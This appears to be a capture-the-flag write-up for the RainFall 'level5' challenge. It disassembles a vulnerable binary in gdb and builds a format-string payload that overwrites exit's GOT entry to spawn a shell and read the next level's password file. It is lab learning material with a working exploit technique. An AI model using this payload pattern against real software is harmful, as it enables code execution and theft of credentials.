```sh
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
---Type <return> to continue, or q <return> to quit---
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o #function o()  not called by the program
0x080484c2  n #function n()
0x08048504  main #function main()
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n> # n()
   0x0804850f <+11>:    leave  
   0x08048510 <+12>:    ret    
End of assembler dump.
```
```sh
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax #stdin
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp) #512
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax #buffer[520]
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt> # fgets(buffer, 512, stdin)
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt> #printf(buffer)
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt> # exit(1)
End of assembler dump.
```
```sh
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp) # "/bin/sh"
   0x080484b1 <+13>:    call   0x80483b0 <system@plt> # system("/bin/sh")
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt> # _exit(1)
End of assembler dump.
```

First let's retrieve the offset of our buffer in the stack
```sh
(gdb) b *0x080484f8
Breakpoint 1 at 0x80484f8
(gdb) r
Starting program: /home/user/level5/level5 
AAAA
AAAA

Breakpoint 1, 0x080484f8 in n ()
(gdb) x/20wx $esp
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305 #4
0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007
0xbffff540:     0x00000000      0xb7fde000      0xb7fff53c      0xbffff588
0xbffff550:     0x00000040      0x00000b80      0x00000000      0xb7fde714
(gdb) x/s $esp + 16
0xbffff520:      "AAAA\n"
```

The buffer is located at $esp + 16 (4th argument in printf)

Now we need to override the address of Exit, but we can't do it directly with `0x80483d0` because this is the plt entry for Exit, the PLT section is readonly and even if we overwrote it would do nothing because the PLT section uses the GOT section in order to retrieve real dynamically linked function address

If we disassemble the function located at `0x80483d0` (`exit` in our function `n`):

```sh
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838 # GOT Entry for exit
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

`0x8049838` is the address we need to overwrite

Let's create our payload:

- `\x38\x98\x04\x08`: The address of the GOT Entry in little endian
- `%134513824x`: 134513828 is the decimal value of 0x080484a4 - 4 bytes since we'll be already writing 4 bytes with the address of the GOT Entry
- `%4$n`: We target the 4th element in our stack which are the first 4 bytes of our own buffer

```sh
level5@RainFall:~$ (python -c "print('\x38\x98\x04\x08' + '%134513824x' + '%4\$n')";cat) | ./level5 


              200
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```